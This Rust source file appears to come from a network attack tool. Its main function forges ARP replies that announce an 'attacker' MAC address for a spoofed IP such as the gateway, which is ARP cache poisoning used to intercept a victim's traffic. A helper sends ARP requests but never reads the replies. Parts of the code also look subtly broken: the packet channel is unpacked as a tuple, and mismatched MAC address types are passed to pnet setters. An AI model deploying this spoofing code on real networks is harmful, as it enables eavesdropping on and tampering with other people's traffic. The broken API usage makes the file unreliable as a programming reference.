// src/network/arp.rs

use log::{debug, info, error};
use pnet::datalink;
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::Packet;
use std::net::{IpAddr, Ipv4Addr};
use macaddr::MacAddr6; // Assuming macaddr crate provides MacAddr6

// Placeholder struct to hold interface info needed for sending packets
// You'll need to populate this properly based on the interface name
pub struct InterfaceInfo {
    pub name: String,
    pub mac: MacAddr6, // Attacker's MAC
    pub ip: Ipv4Addr,  // Attacker's IP
    // Add other necessary fields if needed
}

/// Sends a single spoofed ARP reply.
/// `target_ip`: The IP of the device being spoofed (e.g., victim or gateway).
/// `target_mac`: The MAC of the device being spoofed.
/// `spoofed_ip`: The IP we are pretending to be (e.g., gateway's IP when spoofing victim).
/// `interface_info`: Info about the attacker's network interface.
pub fn send_arp_spoof(
    target_ip: Ipv4Addr,
    target_mac: MacAddr6,
    spoofed_ip: Ipv4Addr, // The IP we are spoofing
    interface_info: &InterfaceInfo,
) -> Result<(), Box<dyn std::error::Error>> {

    // --- 1. Find the network interface ---
    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == interface_info.name)
        .ok_or("Interface not found")?;

    // --- 2. Create the ARP packet data ---
    let mut arp_buffer = [0u8; 28]; // Size of an ARP packet
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer)
        .ok_or("Failed to create mutable ARP packet")?;

    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6); // MAC address length
    arp_packet.set_proto_addr_len(4); // IPv4 address length
    arp_packet.set_operation(ArpOperations::Reply); // Spoofed reply
    // Set sender (us, pretending to be spoofed_ip)
    arp_packet.set_sender_hw_addr(interface_info.mac.into()); // Attacker's MAC
    arp_packet.set_sender_proto_addr(spoofed_ip); // The IP we are spoofing
    // Set target (the device we are sending the spoof to)
    arp_packet.set_target_hw_addr(target_mac.into()); // Target's MAC
    arp_packet.set_target_proto_addr(target_ip); // Target's IP

    // --- 3. Create the Ethernet frame ---
    let mut ethernet_buffer = [0u8; 42]; // 14 (Eth header) + 28 (ARP packet)
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer)
        .ok_or("Failed to create mutable Ethernet packet")?;

    ethernet_packet.set_destination(target_mac.into()); // Target's MAC
    ethernet_packet.set_source(interface_info.mac.into()); // Attacker's MAC
    ethernet_packet.set_ethertype(EtherTypes::Arp);
    ethernet_packet.set_payload(arp_packet.packet_mut());

    // --- 4. Send the packet ---
    let (mut tx, _) = datalink::channel(&interface, Default::default())
        .map_err(|e| format!("Failed to create datalink channel: {}", e))?;

    match tx.send_to(ethernet_packet.packet(), None) {
        Some(_) => {
            debug!(
                "Sent ARP spoof: {} is at {} to {} ({})",
                spoofed_ip, interface_info.mac, target_ip, target_mac
            );
            Ok(())
        }
        None => {
            error!("Failed to send ARP spoof packet");
            Err("Failed to send packet via datalink channel".into())
        }
    }
}

/// Resolves an IP address to its MAC address using a standard ARP request.
/// Note: This is a simplified example. Real implementation needs to listen for replies.
/// This function sends the request but doesn't wait for or process the reply here.
pub fn resolve_mac(
    target_ip: Ipv4Addr,
    interface_info: &InterfaceInfo,
) -> Result<(), Box<dyn std::error::Error>> {
    // Similar setup to send_arp_spoof but with Operation::Request
     let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == interface_info.name)
        .ok_or("Interface not found")?;

    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer)
        .ok_or("Failed to create mutable ARP packet for request")?;

    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Request); // This is a request
    // Set sender (us)
    arp_packet.set_sender_hw_addr(interface_info.mac.into()); // Attacker's MAC
    arp_packet.set_sender_proto_addr(interface_info.ip); // Attacker's IP
    // Set target (unknown, we are asking for this)
    arp_packet.set_target_hw_addr([0,0,0,0,0,0]); // Unknown MAC initially
    arp_packet.set_target_proto_addr(target_ip); // IP we want the MAC for

    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer)
        .ok_or("Failed to create mutable Ethernet packet for ARP request")?;

    // Broadcast MAC for ARP requests
    let broadcast_mac: [u8; 6] = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff];
    ethernet_packet.set_destination(broadcast_mac);
    ethernet_packet.set_source(interface_info.mac.into());
    ethernet_packet.set_ethertype(EtherTypes::Arp);
    ethernet_packet.set_payload(arp_packet.packet_mut());

    let (mut tx, _) = datalink::channel(&interface, Default::default())
        .map_err(|e| format!("Failed to create datalink channel for ARP request: {}", e))?;

    match tx.send_to(ethernet_packet.packet(), None) {
        Some(_) => {
            info!("Sent ARP request for {}", target_ip);
            Ok(())
        }
        None => {
            error!("Failed to send ARP request packet");
            Err("Failed to send ARP request via datalink channel".into())
        }
    }
    // IMPORTANT: To get the MAC, you need another part of the code
    // listening on the interface for incoming packets and parsing
    // ARP replies where target_proto_addr == target_ip.
    // That part is not implemented here yet.
}